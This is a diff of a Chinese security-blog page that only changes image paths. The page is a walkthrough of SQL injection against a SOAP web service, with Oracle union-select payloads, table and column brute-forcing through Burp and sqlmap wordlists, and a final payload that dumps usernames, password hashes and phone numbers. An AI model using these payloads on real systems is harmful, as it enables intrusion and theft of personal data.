@@ -14,26 +14,26 @@
 <meta property="og:site_name" content="回忆飘如雪">
 <meta property="og:description" content="如何对Web Services服务进行注入？我们都知道sqlmap等一些工具不能对web services服务进行注入，因为web services使用的是SOAP协议，与我们提传统的http协议有些差异。手工+工具结合的方法完成这次的漏洞利用。下面我们一个案例演示一下，如何利用burp+sqlmap字典进行注入web services。 访问以下地址: 1http://www.xxx.com/s">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://gv7.me/.me//1.png">
-<meta property="og:image" content="http://gv7.me/.me//2.png">
-<meta property="og:image" content="http://gv7.me/.me//3.png">
-<meta property="og:image" content="http://gv7.me/.me//4.png">
-<meta property="og:image" content="http://gv7.me/.me//5.png">
-<meta property="og:image" content="http://gv7.me/.me//6.png">
-<meta property="og:image" content="http://gv7.me/.me//7.png">
-<meta property="og:image" content="http://gv7.me/.me//8.png">
-<meta property="og:image" content="http://gv7.me/.me//9.png">
-<meta property="og:image" content="http://gv7.me/.me//10.png">
-<meta property="og:image" content="http://gv7.me/.me//11.png">
-<meta property="og:image" content="http://gv7.me/.me//12.png">
-<meta property="og:image" content="http://gv7.me/.me//13.png">
-<meta property="og:image" content="http://gv7.me/.me//14.png">
-<meta property="og:image" content="http://gv7.me/.me//15.png">
+<meta property="og:image" content="http://gv7.me/articles/2017/how-do-sql-inject-web-services/1.png">
+<meta property="og:image" content="http://gv7.me/articles/2017/how-do-sql-inject-web-services/2.png">
+<meta property="og:image" content="http://gv7.me/articles/2017/how-do-sql-inject-web-services/3.png">
+<meta property="og:image" content="http://gv7.me/articles/2017/how-do-sql-inject-web-services/4.png">
+<meta property="og:image" content="http://gv7.me/articles/2017/how-do-sql-inject-web-services/5.png">
+<meta property="og:image" content="http://gv7.me/articles/2017/how-do-sql-inject-web-services/6.png">
+<meta property="og:image" content="http://gv7.me/articles/2017/how-do-sql-inject-web-services/7.png">
+<meta property="og:image" content="http://gv7.me/articles/2017/how-do-sql-inject-web-services/8.png">
+<meta property="og:image" content="http://gv7.me/articles/2017/how-do-sql-inject-web-services/9.png">
+<meta property="og:image" content="http://gv7.me/articles/2017/how-do-sql-inject-web-services/10.png">
+<meta property="og:image" content="http://gv7.me/articles/2017/how-do-sql-inject-web-services/11.png">
+<meta property="og:image" content="http://gv7.me/articles/2017/how-do-sql-inject-web-services/12.png">
+<meta property="og:image" content="http://gv7.me/articles/2017/how-do-sql-inject-web-services/13.png">
+<meta property="og:image" content="http://gv7.me/articles/2017/how-do-sql-inject-web-services/14.png">
+<meta property="og:image" content="http://gv7.me/articles/2017/how-do-sql-inject-web-services/15.png">
 <meta property="og:updated_time" content="2019-02-16T18:06:16.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="发现Web Services存在注入，无法用sqlmap怎么办？">
 <meta name="twitter:description" content="如何对Web Services服务进行注入？我们都知道sqlmap等一些工具不能对web services服务进行注入，因为web services使用的是SOAP协议，与我们提传统的http协议有些差异。手工+工具结合的方法完成这次的漏洞利用。下面我们一个案例演示一下，如何利用burp+sqlmap字典进行注入web services。 访问以下地址: 1http://www.xxx.com/s">
-<meta name="twitter:image" content="http://gv7.me/.me//1.png">
+<meta name="twitter:image" content="http://gv7.me/articles/2017/how-do-sql-inject-web-services/1.png">
     
     
         
@@ -180,18 +180,18 @@
 <p>访问以下地址:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/services</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.me//1.png" alt="图1-web service的wdls列表"></p>
+<p><img src="/articles/2017/how-do-sql-inject-web-services/1.png" alt="图1-web service的wdls列表"></p>
 <h2 id="0x01扫描"><a href="#0x01扫描" class="headerlink" title="0x01扫描"></a>0x01扫描</h2><p>将列表中的的WSDL地址依次丢到AWVS的Web Services Scanner中进行扫描，发现存在sql注入</p>
-<p><img src="/.me//2.png" alt="图2-AWVS扫描结果"></p>
+<p><img src="/articles/2017/how-do-sql-inject-web-services/2.png" alt="图2-AWVS扫描结果"></p>
 <h2 id="0x02识别正常返回与异常返回"><a href="#0x02识别正常返回与异常返回" class="headerlink" title="0x02识别正常返回与异常返回"></a>0x02识别正常返回与异常返回</h2><p>转到AWVS中的Web Services Editor中import刚才扫描的</p>
-<h3 id="正常返回（有数据）"><a href="#正常返回（有数据）" class="headerlink" title="正常返回（有数据）"></a>正常返回（有数据）</h3><p><img src="/.me//3.png" alt="图3-正常返回（有数据）"></p>
-<h3 id="正常返回（无数据）"><a href="#正常返回（无数据）" class="headerlink" title="正常返回（无数据）"></a>正常返回（无数据）</h3><p><img src="/.me//4.png" alt="图4-正常返回（无数据）"></p>
-<h3 id="异常返回"><a href="#异常返回" class="headerlink" title="异常返回"></a>异常返回</h3><p><img src="/.me//5.png" alt="图5-异常返回"></p>
+<h3 id="正常返回（有数据）"><a href="#正常返回（有数据）" class="headerlink" title="正常返回（有数据）"></a>正常返回（有数据）</h3><p><img src="/articles/2017/how-do-sql-inject-web-services/3.png" alt="图3-正常返回（有数据）"></p>
+<h3 id="正常返回（无数据）"><a href="#正常返回（无数据）" class="headerlink" title="正常返回（无数据）"></a>正常返回（无数据）</h3><p><img src="/articles/2017/how-do-sql-inject-web-services/4.png" alt="图4-正常返回（无数据）"></p>
+<h3 id="异常返回"><a href="#异常返回" class="headerlink" title="异常返回"></a>异常返回</h3><p><img src="/articles/2017/how-do-sql-inject-web-services/5.png" alt="图5-异常返回"></p>
 <h2 id="0x03判断数据库类型"><a href="#0x03判断数据库类型" class="headerlink" title="0x03判断数据库类型"></a>0x03判断数据库类型</h2><p>由于一般的jsp应用基本都使用oracle数据库，我们优先判断是否是oracle数据库！</p>
 <p>注入语句：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; or chr(123)||chr(123)=chr(123)||chr(123) -- </span><br><span class="line">-1&apos; or (select count (*) from user_tables)&gt;0 --</span><br><span class="line">-1&apos; or (select count (*) from dual)&gt;0 --</span><br></pre></td></tr></table></figure>
 
-<p>发现他们都返回正常，说明为oracle数据库<br><img src="/.me//6.png" alt="图6-是否为oracle"></p>
+<p>发现他们都返回正常，说明为oracle数据库<br><img src="/articles/2017/how-do-sql-inject-web-services/6.png" alt="图6-是否为oracle"></p>
 <h2 id="0x04判断字段个数"><a href="#0x04判断字段个数" class="headerlink" title="0x04判断字段个数"></a>0x04判断字段个数</h2><p>使用 order by num语句来判断字段的个数。</p>
 <p>根据以下注入语句的结果，可知字段个数为25</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; or order by 25 --   /*返回正常*/</span><br><span class="line">-1&apos; or order by 26 --	/*返回异常*/</span><br></pre></td></tr></table></figure>
@@ -199,35 +199,35 @@
 <h2 id="0x05确定每个字段类型"><a href="#0x05确定每个字段类型" class="headerlink" title="0x05确定每个字段类型"></a>0x05确定每个字段类型</h2><p>由于我们此时不知道每个字段的类型，所以先用null来代替。故注入语句构造如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null from user_tables --</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.me//7.png" alt="图7"></p>
+<p><img src="/articles/2017/how-do-sql-inject-web-services/7.png" alt="图7"></p>
 <p>判断方法如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select 1,null,null,... from user_tables -- /*返回正常，说明该字段为数字型*/</span><br><span class="line">-1&apos; union select &apos;1&apos;,null,null,... from user_tables -- /*返回正常，说明该字段为字符型*/</span><br></pre></td></tr></table></figure>
 
 <p>使用以上方法测试每个字段，发现它们都是字符型</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select &apos;1&apos;,&apos;2&apos;,&apos;3&apos;,&apos;4&apos;,&apos;5&apos;,&apos;6&apos;,&apos;7&apos;,&apos;8&apos;,&apos;9&apos;,&apos;10&apos;,&apos;11&apos;,&apos;12&apos;,&apos;13&apos;,&apos;14&apos;,&apos;15&apos;,&apos;16&apos;,&apos;17&apos;,&apos;18&apos;,&apos;19&apos;,&apos;20&apos;,&apos;21&apos;,&apos;22&apos;,&apos;23&apos;,&apos;24&apos;,&apos;25&apos; from user_tables --</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.me//8.png" alt="图8"></p>
+<p><img src="/articles/2017/how-do-sql-inject-web-services/8.png" alt="图8"></p>
 <h2 id="0x06爆破表名"><a href="#0x06爆破表名" class="headerlink" title="0x06爆破表名"></a>0x06爆破表名</h2><p>由于这样的格式我们无法使用sqlmap进行注入。</p>
 <p>思路：使用burp+sqlmap的tables字典，对下面语句的user_tables表名进行爆破。</p>
 <p>设置AWVS的代理为burp suite的本机代理</p>
-<p><img src="/.me//9.png" alt="图9设置AWVS代理"></p>
+<p><img src="/articles/2017/how-do-sql-inject-web-services/9.png" alt="图9设置AWVS代理"></p>
 <p>将数据包从AWVS的Web Servives Editor里送入burp suite的Intruder中</p>
-<p><img src="/.me//10.png" alt="图10发送数据包到burp suite"></p>
+<p><img src="/articles/2017/how-do-sql-inject-web-services/10.png" alt="图10发送数据包到burp suite"></p>
 <p>选择sqlmap的txt目录下的表字典common-tables.txt，进行爆破。</p>
-<p><img src="/.me//11.png" alt="图11爆破表名"></p>
+<p><img src="/articles/2017/how-do-sql-inject-web-services/11.png" alt="图11爆破表名"></p>
 <p>爆破表名结果</p>
-<p><img src="/.me//12.png" alt="图12爆破表名结果"></p>
+<p><img src="/articles/2017/how-do-sql-inject-web-services/12.png" alt="图12爆破表名结果"></p>
 <h2 id="0x07爆破字段名"><a href="#0x07爆破字段名" class="headerlink" title="0x07爆破字段名"></a>0x07爆破字段名</h2><p>爆破字段名，思路入爆破表名一致。语句是</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select columns,&apos;2&apos;,&apos;3&apos;,&apos;4&apos;,&apos;5&apos;,&apos;6&apos;,&apos;7&apos;,&apos;8&apos;,&apos;9&apos;,&apos;10&apos;,&apos;11&apos;,&apos;12&apos;,&apos;13&apos;,&apos;14&apos;,&apos;15&apos;,&apos;16&apos;,&apos;17&apos;,&apos;18&apos;,&apos;19&apos;,&apos;20&apos;,&apos;21&apos;,&apos;22&apos;,&apos;23&apos;,&apos;24&apos;,&apos;25&apos; from  tbl_user --</span><br></pre></td></tr></table></figure>
 
 <p>注意：tbl_user为上一步骤爆破发现的表名,colums为使用burp加载sqlmap字段字典common-columns.txt进行爆破的地方。</p>
-<p><img src="/.me//13.png" alt="图13-爆破字段名"></p>
+<p><img src="/articles/2017/how-do-sql-inject-web-services/13.png" alt="图13-爆破字段名"></p>
 <p>设置过程与爆破表名类似不在细说，爆破结果结果如图所示。</p>
-<p><img src="/.me//14.png" alt="图14-爆破字段名结果"></p>
+<p><img src="/articles/2017/how-do-sql-inject-web-services/14.png" alt="图14-爆破字段名结果"></p>
 <h2 id="0x08导出账号密码"><a href="#0x08导出账号密码" class="headerlink" title="0x08导出账号密码"></a>0x08导出账号密码</h2><p>综上最终注入语句为：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select user,password,mobile,&apos;4&apos;,&apos;5&apos;,&apos;6&apos;,&apos;7&apos;,&apos;8&apos;,&apos;9&apos;,&apos;10&apos;,&apos;11&apos;,&apos;12&apos;,&apos;13&apos;,&apos;14&apos;,&apos;15&apos;,&apos;16&apos;,&apos;17&apos;,&apos;18&apos;,&apos;19&apos;,&apos;20&apos;,&apos;21&apos;,&apos;22&apos;,&apos;23&apos;,&apos;24&apos;,&apos;25&apos; from  tbl_user --</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.me//15.png" alt="图15-注入得到账号密码"></p>
+<p><img src="/articles/2017/how-do-sql-inject-web-services/15.png" alt="图15-注入得到账号密码"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">账号：DT*****AP </span><br><span class="line">密码：e10adc3949ba59abbe56e057f20f883e</span><br><span class="line">电话：139*****887</span><br></pre></td></tr></table></figure>
 
 <h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
